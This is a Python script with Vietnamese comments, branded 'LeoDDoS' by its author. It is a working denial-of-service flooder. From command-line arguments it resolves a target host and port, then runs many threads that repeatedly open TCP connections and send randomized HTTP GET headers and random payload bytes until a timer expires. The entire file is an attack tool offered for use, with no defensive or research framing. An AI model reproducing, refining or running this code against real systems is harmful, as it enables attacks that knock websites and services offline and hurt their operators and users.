import random, socket, threading, os, sys, time, string

# --- DANH SÁCH USER-AGENTS HIỆN ĐẠI ---
useragents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
]

acceptall = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: vi-VN,vi;q=0.9,en-US;q=0.8\r\n',
    'Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n'
]

referers = [
    'https://www.google.com/search?q=',
    'https://www.facebook.com/',
    'https://t.co/',
    'https://duckduckgo.com/?q='
]

# --- KIỂM TRA THAM SỐ DÒNG LỆNH ---
# Chỉnh lại kiểm tra len(sys.argv) thành 6 (IP, PORT, PACKET, THREADS, TIME)
if len(sys.argv) != 6:
    print("\033[91m[!] Thieu tham so! Cách dùng: python3 l3.py <IP> <PORT> <PACKET> <THREADS> <TIME>\033[0m")
    sys.exit()

try:
    target_arg = sys.argv[1]
    port = int(sys.argv[2])
    packet_size = int(sys.argv[3])
    threads = int(sys.argv[4])
    attack_time = int(sys.argv[5])

    if packet_size < 0 or threads < 0 or attack_time < 0:
        print("\033[91m[!] PACKET, THREADS và TIME phai là số duong!\033[0m")
        sys.exit()
except ValueError:
    print("\033[91m[!] PORT, PACKET, THREADS và TIME phai là chu so!\033[0m")
    sys.exit()

try:
    ip = socket.gethostbyname(target_arg)
except:
    print("\033[91m[!] Khong the phan giai Host/IP\033[0m")
    sys.exit()

# Khoi tao du lieu mau
payload = random._urandom(packet_size)

# Thiết lập mốc thời gian kết thúc
timeout = time.time() + attack_time

# --- GIAO DIEN PANEL ---
os.system("clear")
print("""   ███
  █   █
  █   █
█████████               ██
█████████              █  
█
███   ███ ██████████████  █ >> LeoC2 Private Tools By Leo <<
████ ████ █ █          █  █
█████████               ██""")
print("Logged In As Leo")
time.sleep(1)
os.system("clear")
print("\033[93m")
print("""───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to LeoDDoS
───█▒▒░░░░░░░░░▒▒█───   Made By : Leo
────█░░█░░░░░█░░█────   Tiktok : @leoinicuy
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
print(f"\033[92mTarget: {ip} | Port: {port} | Time: {attack_time}s | Threads: {threads}\033[0m")

def attack():
    # Vòng lặp kiểm tra thời gian
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            header = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_arg}\r\n"
                f"User-Agent: {random.choice(useragents)}\r\n"
                f"{random.choice(acceptall)}"
                f"Referer: {random.choice(referers)}{random.choice(string.ascii_letters)}\r\n"
                f"Connection: Keep-Alive\r\n\r\n"
            )
            s.send(header.encode())
            s.send(payload)
            s.close()
        except:
            try: s.close()
            except: pass

def run_fast():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(15):
                # Kiểm tra lại thời gian trong vòng lặp nhỏ để thoát nhanh hơn
                if time.time() > timeout:
                    break
                s.send(payload)
            print(f"\033[94m[+] Attack By @leoinicuy To => {ip}\033[0m")
            s.close()
        except:
            try: s.close()
            except: pass

# --- KHOI CHAY ---
for _ in range(threads):
    threading.Thread(target=attack).start()
    threading.Thread(target=run_fast).start()

# Chờ đợi cho đến khi hết thời gian tấn công
time.sleep(attack_time)
print(f"\n\033[91m[!] Attack Finished after {attack_time} seconds.\033[0m")
os._exit(0) # Buộc thoát tất cả các luồng ngay lập tức

